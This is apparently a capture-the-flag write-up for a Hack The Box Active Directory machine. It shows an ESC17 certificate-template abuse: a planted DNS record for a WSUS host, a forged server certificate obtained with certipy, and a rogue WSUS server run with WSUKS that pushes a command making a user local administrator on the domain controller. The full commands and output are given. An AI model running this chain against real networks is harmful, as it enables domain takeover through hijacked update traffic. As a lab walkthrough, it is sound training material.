
The previous phase concluded with the discovery that the UpdateSrv certificate template is vulnerable to ESC17. It's an Active Directory Certificate Services (AD CS) misconfiguration classification. It occurs when a certificate template allows low-privileged users to request server authentication certificates with an enrollee-supplied Subject Alternative Name (SAN), which attackers can combine with weak DNS access controls to intercept secure traffic like HTTPS-enabled WSUS clients. 

**Prerequisites**:

```
- Members of the IT group are permitted to enroll.
- The requester is allowed to specify the certificate subject.
- Certificates are issued automatically without approval.
- The template supports Server Authentication.
```

Found an interesting .html file in C:\Users\jaylee.clifton\Documents\Tickets which revealed an interesting internal target "wsus.logging.htb" endpoint, WSUS Stands for Windows Server Update Services deployment that trusts certificates issued through the vulnerable template. Also information about that the dns isn't even set for this endpoint & that he created an scheduled task "ForceSync" which runs every 120 seconds.

1. Using the Kerberos credential cache previously extracted from jaylee.clifton, BloodyAD is used to enumerate writable Active Directory objects:

```
KRB5CCNAME=jaylee.clifton.ccache bloodyad --host DC01.logging.htb -d logging.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=jaylee.clifton,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

The CREATE_CHILD permission over the DNS zone allows new DNS records to be created.

2. Create new DNS Record

```
KRB5CCNAME=jaylee.clifton.ccache bloodyAD --host DC01.logging.htb -d logging.htb -k add dnsRecord 'wsus' 10.10.14.57
```

or with

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'logging.htb\wallace.everette' -p 'Welcome2026@' 10.129.56.45 -a add -r wsus.logging.htb -d 10.10.14.57
```

3. Now in order to view web traffic and the reverse-callback we just need to request an certificate! Since we identified previously that we can request an certificate with our user for the Correct Template, let's do it.

```
KRB5CCNAME=jaylee.clifton.ccache certipy-ad req -u jaylee.clifton -k -dc-ip 10.129.56.45 -target DC01.logging.htb -ca logging-DC01-CA -template UpdateSrv -dns wsus.logging.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'wsus.pfx'
[*] Wrote certificate and private key to 'wsus.pfx'
```

4. Since the exploitation tool expects a PEM-formatted certificate, the PFX file is converted using OpenSSL:

```
openssl pkcs12 -in wsus.pfx -out wsus.pem -nodes --passin pass:
```

The resulting wsus.pem file contains both the certificate and its associated private key.

This certificate will allow the attacker’s server to impersonate the legitimate WSUS server during TLS communication.
##### Installing WSUKS

- To perform the WSUS man-in-the-middle attack, the WSUKS tool is installed.

5. A dedicated Python virtual environment is created:

```
python -m venv myenv
```

6. Activate the environment

```
source myenv/bin/activate
```

7. Install the required dependencies:

```
sudo apt install pipx python3-nftables
```

8. Ensure the user’s local binaries are available:

```
pipx ensurepath
```

9. Install WSUKS:

```
pipx install wsuks --system-site-packages
```

10. Finally, create a symbolic link so the executable is available system-wide:

```
sudo ln -s ~/.local/bin/wsuks /usr/sbin/wsuks
```

11. Launching the Rogue WSUS Server

- The objective is simple. When the Domain Controller contacts what it believes is the legitimate WSUS server, it should instead connect to the attacker’s server.
- Rather than distributing a software update, WSUKS is instructed to execute a command that adds wallace.everette to the local Administrators group.
- The rogue WSUS server is started:

```
sudo wsuks -t DC01.logging.htb --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0 --serve-only -c '/accepteula /s cmd /k "net localgroup administrators /add wallace.everette"'
```

12. Verifying Admin Access.

```
nxc smb DC01.logging.htb -u wallace.everette -p 'Welcome2026@'
SMB         10.129.56.45    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.56.45    445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ (Pwn3d!)
```

Connected to the DC.

```
impacket-psexec wallace.everette:'Welcome2026@'@dc01.logging.htb
```